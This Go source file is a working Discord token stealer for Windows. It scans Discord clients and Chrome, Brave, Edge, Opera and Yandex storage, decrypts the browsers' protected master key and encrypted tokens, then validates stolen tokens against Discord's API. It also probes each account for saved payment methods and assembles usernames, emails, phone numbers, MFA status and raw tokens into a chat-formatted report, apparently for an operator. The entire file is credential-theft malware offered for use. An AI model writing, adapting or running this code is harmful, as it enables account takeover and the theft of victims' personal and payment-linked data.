package handlers

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// basic, but not kill discord proc

var (
	tokenRegex     = regexp.MustCompile(`(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,})`)
	encryptedRegex = regexp.MustCompile(`dQw4w9WgXcQ:([^\"]*)`)
	foundTokens    = make(map[string]bool)
)

type pathInfo struct {
	Name           string
	Path           string
	LocalStatePath string
}

type discordAccount struct {
	Token     string `json:"-"`
	Username  string `json:"username"`
	Discrim   string `json:"discriminator"`
	UserID    string `json:"id"`
	Email     string `json:"email"`
	Phone     string `json:"phone"`
	MFA       bool   `json:"mfa_enabled"`
	Nitro     int    `json:"premium_type"`
	Avatar    string `json:"avatar"`
	Source    string `json:"-"`
	Billing   bool   `json:"-"`
	AvatarURL string `json:"-"`
}


func GrabTokens() string {
	var accounts []discordAccount
	paths := getPaths()

	for _, p := range paths {
		masterKey := decryptMasterKey(p.LocalStatePath)
		leveldbPath := filepath.Join(p.Path, "Local Storage", "leveldb")

		if _, err := os.Stat(leveldbPath); os.IsNotExist(err) {
			continue
		}

		files, _ := ioutil.ReadDir(leveldbPath)
		for _, file := range files {
			if !strings.HasSuffix(file.Name(), ".ldb") && !strings.HasSuffix(file.Name(), ".log") {
				continue
			}

			filePath := filepath.Join(leveldbPath, file.Name())
			content, err := ioutil.ReadFile(filePath)
			if err != nil {
				continue
			}

			for _, match := range tokenRegex.FindAllSubmatch(content, -1) {
				token := string(match[0])
				if acc, valid := validateToken(token); valid {
					acc.Source = p.Name
					if !foundTokens[acc.UserID] {
						accounts = append(accounts, acc)
						foundTokens[acc.UserID] = true
					}
				}
			}

			if masterKey != nil {
				for _, match := range encryptedRegex.FindAllSubmatch(content, -1) {
					encryptedTokenB64 := string(match[1])
					encryptedToken, err := base64.StdEncoding.DecodeString(encryptedTokenB64)
					if err != nil {
						continue
					}
					decryptedToken, err := decryptToken(encryptedToken, masterKey)
					if err == nil {
						if acc, valid := validateToken(decryptedToken); valid {
							acc.Source = p.Name
							if !foundTokens[acc.UserID] {
								accounts = append(accounts, acc)
								foundTokens[acc.UserID] = true
							}
						}
					}
				}
			}
		}
	}
	return formatResults(accounts)
}

func getPaths() []pathInfo {
	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")
	paths := []pathInfo{
		{Name: "Discord", Path: filepath.Join(appdata, "discord"), LocalStatePath: filepath.Join(appdata, "discord", "Local State")},
		{Name: "Discord Canary", Path: filepath.Join(appdata, "discordcanary"), LocalStatePath: filepath.Join(appdata, "discordcanary", "Local State")},
		{Name: "Discord PTB", Path: filepath.Join(appdata, "discordptb"), LocalStatePath: filepath.Join(appdata, "discordptb", "Local State")},
		{Name: "Google Chrome", Path: filepath.Join(localAppdata, "Google", "Chrome", "User Data"), LocalStatePath: filepath.Join(localAppdata, "Google", "Chrome", "User Data", "Local State")},
		{Name: "Brave", Path: filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"), LocalStatePath: filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State")},
		{Name: "Microsoft Edge", Path: filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"), LocalStatePath: filepath.Join(localAppdata, "Microsoft", "Edge", "User Data", "Local State")},
		{Name: "Yandex", Path: filepath.Join(localAppdata, "Yandex", "YandexBrowser", "User Data"), LocalStatePath: filepath.Join(localAppdata, "Yandex", "YandexBrowser", "User Data", "Local State")},
		{Name: "Opera", Path: filepath.Join(appdata, "Opera Software", "Opera Stable"), LocalStatePath: filepath.Join(appdata, "Opera Software", "Opera Stable", "Local State")},
		{Name: "Opera GX", Path: filepath.Join(appdata, "Opera Software", "Opera GX Stable"), LocalStatePath: filepath.Join(appdata, "Opera Software", "Opera GX Stable", "Local State")},
	}
	return paths
}

func decryptMasterKey(localStatePath string) []byte {
	content, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var state struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if json.Unmarshal(content, &state) != nil {
		return nil
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil
	}

	encryptedKey = encryptedKey[5:]
	decryptedKey, err := cryptUnprotectData(encryptedKey)
	if err != nil {
		return nil
	}
	return decryptedKey
}

func decryptToken(encryptedToken, masterKey []byte) (string, error) {
	iv := encryptedToken[3:15]
	payload := encryptedToken[15:]
	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	decryptedBytes, err := aesgcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}
	return string(decryptedBytes), nil
}

func validateToken(token string) (discordAccount, bool) {
	var acc discordAccount
	req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	req.Header.Set("Authorization", token)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return acc, false
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	if json.Unmarshal(body, &acc) != nil {
		return acc, false
	}

	req, _ = http.NewRequest("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", nil)
	req.Header.Set("Authorization", token)
	resp, err = client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		var billingInfo []interface{}
		body, _ := ioutil.ReadAll(resp.Body)
		if json.Unmarshal(body, &billingInfo) == nil && len(billingInfo) > 0 {
			acc.Billing = true
		}
	}
	defer resp.Body.Close()

	if acc.Avatar != "" {
		acc.AvatarURL = fmt.Sprintf("https://cdn.discordapp.com/avatars/%s/%s.png", acc.UserID, acc.Avatar)
	} else {
		acc.AvatarURL = "N/A"
	}
	acc.Token = token
	return acc, true
}

func formatResults(accounts []discordAccount) string {
	if len(accounts) == 0 {
		return "No valid discord tokens were found"
	}
	var builder strings.Builder
	builder.WriteString(fmt.Sprintf("🔑 **Found %d Discord accounts:**\n\n", len(accounts)))
	for i, acc := range accounts {
		nitroMap := map[int]string{0: "No", 1: "Nitro Classic", 2: "Nitro Boost"}
		builder.WriteString("```ini\n")
		builder.WriteString(fmt.Sprintf("[CUENTA #%d - %s#%s]\n", i+1, acc.Username, acc.Discrim))
		builder.WriteString(fmt.Sprintf("; Encontrado en = %s\n", acc.Source))
		builder.WriteString(fmt.Sprintf("UserID     = %s\n", acc.UserID))
		builder.WriteString(fmt.Sprintf("Email      = %s\n", acc.Email))
		builder.WriteString(fmt.Sprintf("Phone      = %s\n", acc.Phone))
		builder.WriteString(fmt.Sprintf("MFA        = %t\n", acc.MFA))
		builder.WriteString(fmt.Sprintf("Nitro      = %s\n", nitroMap[acc.Nitro]))
		builder.WriteString(fmt.Sprintf("Billing    = %t\n", acc.Billing))
		builder.WriteString(fmt.Sprintf("Avatar URL = %s\n\n", acc.AvatarURL))
		builder.WriteString(fmt.Sprintf("[TOKEN]\n%s\n", acc.Token))
		builder.WriteString("```\n")
	}
	return builder.String()
}


type dataBlob struct {
	cbData uint32
	pbData *byte
}

var (
	crypt32                = syscall.NewLazyDLL("Crypt32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
)

func cryptUnprotectData(encryptedData []byte) ([]byte, error) {
	var outblob dataBlob
	inblob := dataBlob{cbData: uint32(len(encryptedData)), pbData: &encryptedData[0]}
	r, _, err := procCryptUnprotectData.Call(uintptr(unsafe.Pointer(&inblob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outblob.pbData)))
	decrypted := make([]byte, outblob.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(outblob.pbData))[:outblob.cbData:outblob.cbData])
	return decrypted, nil
}
